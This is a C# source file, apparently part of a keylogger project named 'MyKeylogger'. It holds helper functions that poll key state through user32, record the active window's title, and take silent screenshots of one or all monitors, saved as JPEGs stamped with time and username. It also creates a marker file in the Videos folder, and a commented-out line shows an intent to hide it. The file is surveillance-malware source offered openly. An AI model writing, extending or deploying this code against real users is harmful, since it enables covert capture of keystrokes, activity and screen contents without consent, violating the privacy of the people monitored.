using MyKeylogger.Lib.HotKeys;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace tt
{
    public static class Functions
    {
        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]

        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);
        [DllImport("user32.dll")]

        internal static extern short GetKeyState(Keys nVirtualKey);

        public static bool IsToggled(this Keys key)
        {
            return GetKeyState(key) == 0x1;
        }

        public static bool IsKeyPressed(this Keys key)
        {
            var result = GetKeyState(key);
            switch (result)
            {
                case 0: return false;
                case 1: return false;
                default: return true;
            }
        }

        public static string GetActiveWindowText()
        {
            var handle = GetForegroundWindow();
            var sb = new StringBuilder();
            GetWindowText(handle, sb, 1000);
            return sb.Length == 0 ? "UnhandleWindow" : sb.ToString();
        }

        public static void CreateFile()
        {
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini"))
                return;
            File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini").Dispose();
            // File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini", FileAttributes.Hidden);
        }

        public static void SetHotKey()
        {
            HotKeySet hks = new HotKeySet(new[] { Keys.T, Keys.LShiftKey, Keys.RShiftKey });
            hks.RegisterExclusiveOrKey(new[] { Keys.LShiftKey, Keys.RShiftKey });
            //if(is)
        }

        public static void ScreenShotSingleScreen(string imagePath, Int64 quality, int imageCount, string imageExtendtion, bool Timestamp_Username)
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                       Screen.PrimaryScreen.Bounds.Height,
                                       PixelFormat.Format32bppArgb);

            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            string imageName = "";
            if (Timestamp_Username == true)
                imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString() + '_' + imageCount + '_' + Environment.UserName, imageExtendtion);
            else
                imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString(), imageExtendtion);

            try
            {
                var encoder = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
                var encParams = new EncoderParameters() { Param = new[] { new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality) } };
                bmpScreenshot.Save(imageName, encoder, encParams);
            }
            catch
            {

            }
            imageCount++;


        }

        public static void ScreenShotDoubleScreen(string imagePath, Int64 quality, int imageCount, bool Timestamp_Username, string imageExtendtion)
        {
            Rectangle desktopRec = GetDesktopBound();
            Bitmap bitmap = new Bitmap(desktopRec.Width, desktopRec.Height);
            using (Graphics graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(desktopRec.Location, Point.Empty, bitmap.Size);
            }

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }

            string imageName = "";
            if (Timestamp_Username == true)
                imageName = string.Format("{0}\\{1}{2}", directoryImage, imageCount + '_' + DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString() + '_' + Environment.UserName, imageExtendtion);
            else
                imageName = string.Format("{0}\\{1}{2}", directoryImage, imageCount + '_' + DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString(), imageExtendtion);

            try
            {
                var encoder = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
                var encParams = new EncoderParameters() { Param = new[] { new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality) } };
                bitmap.Save(imageName, encoder, encParams);
            }
            catch
            {

            }
            imageCount++;
        }
        private static Rectangle GetDesktopBound()
        {
            Rectangle result = new Rectangle();
            foreach (Screen screen in Screen.AllScreens)
                result = Rectangle.Union(result, screen.Bounds);
            return result;
        }



    }
}